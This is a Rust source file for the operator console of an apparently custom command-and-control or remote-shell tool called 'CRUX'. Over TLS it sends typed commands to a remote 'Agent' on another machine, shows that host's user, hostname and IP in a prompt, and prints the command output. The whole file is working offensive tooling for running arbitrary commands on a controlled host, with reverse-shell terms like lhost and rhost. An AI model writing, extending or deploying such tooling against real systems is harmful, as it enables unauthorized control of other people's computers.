#[path = "../utils/mod.rs"]
mod utils;

// crates
use colored::Colorize;
use clap::error::Result;
use native_tls::TlsStream;
use rustyline::error::ReadlineError;
use rustyline::DefaultEditor;

// std
use std::net::{TcpStream};

// my stuff
use utils::network::{write_length_prefix, read_length_prefix};
use utils::data::{Cmd, CmdType, CmdResult};
use utils::os::Metadata;


fn send_cmd(stream: &mut TlsStream<TcpStream>, cmd_type: CmdType, args_str: String) -> Result<(),Box<dyn std::error::Error>>{
    let cmd = Cmd {
        cmd_type: cmd_type,
        args: args_str
    };
    let cmd_str = serde_json::to_string(&cmd)?;
    write_length_prefix(stream, cmd_str.as_bytes())?;
    return Ok(());
}

// Determine prompt symbol based on username
fn parse_prompt_symbol(username: &str) -> String {
    match username {
        "root" => return '#'.to_string(),
        _ => return '$'.to_string()
    };
}

pub fn linux_shell(stream: &mut TlsStream<TcpStream>, meta_str: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Prompt Preparation
    let mut status = 0;
    let metadata: Metadata = serde_json::from_str(&meta_str)?;

    let prompt_symbol = parse_prompt_symbol(&metadata.username);
    let peer_ip = stream.get_ref().peer_addr()?.to_string();
    let mut rl = DefaultEditor::new()?;

    // Main CLI loop
    loop {
        let mut prompt = format!("{}|{}@{}|{}|{} ",
            "CRUX".yellow().bold(),
            metadata.username.blue().bold(),
            metadata.hostname.cyan().bold(),
            peer_ip.red().bold(),
            prompt_symbol.green().bold());
        // Prepend status if it's not 0
        if status != 0 {
            prompt = format!("[{}]{}", status.to_string().red().bold(), prompt);
        }

        match rl.readline(&prompt) {
            Ok(input) => {
                if input.is_empty() {
                    continue;
                }
                // Record history
                let _ = rl.add_history_entry(input.as_str());

                // Handle input
                let input = input.trim();
                let mut parts = input.splitn(2, ' ');
                let cmd = match parts.next() {
                    Some(cmd) => cmd,
                    _none => continue,
                };
                let args = parts.next().unwrap_or("");

                match cmd {
                    "exit" | "quit" => {
                        send_cmd(stream, CmdType::Exit, "".to_string())?;
                    }
                    "cd" => {
                        send_cmd(stream, CmdType::Cd, args.to_string())?;
                    }
                    "setvar" => {
                        send_cmd(stream, CmdType::Setvar, args.to_string())?;
                    }
                    "export" => {
                        send_cmd(stream, CmdType::Export, args.to_string())?;
                    }
                    "download" => {
                        println!("File download feature under construction...");
                        continue;
                    }
                    "upload" => {
                        println!("File upload feature under construction...");
                        continue;
                    }
                    "clear" => { // Currently not working for some reason
                        print!("\x1B[2J");
                        continue;
                    }
                    "lhost" => {
                        println!("{}", stream.get_ref().local_addr()?);
                        continue;
                    }
                    "rhost" => {
                        println!("{}", stream.get_ref().peer_addr()?);
                        continue;
                    }
                    _ => {
                        send_cmd(stream, CmdType::Exec, input.to_string())?;
                    }
                }
                // Receive and parse command output
                let received_output_raw = read_length_prefix(stream)?;
                let received_output: CmdResult = serde_json::from_slice(&received_output_raw)?;
                println!("{}", received_output.output);
                status = received_output.status;
            } // Ok(input)
            Err(ReadlineError::Interrupted) => {
                // TODO: Signal Agent to cancel execution
                continue;
            }
            Err(ReadlineError::Eof) => {
                break;
            }
            Err(err) => {
                eprintln!("Error: {:?}", err);
                break;
            }
        }
    }
    return Ok(())
}
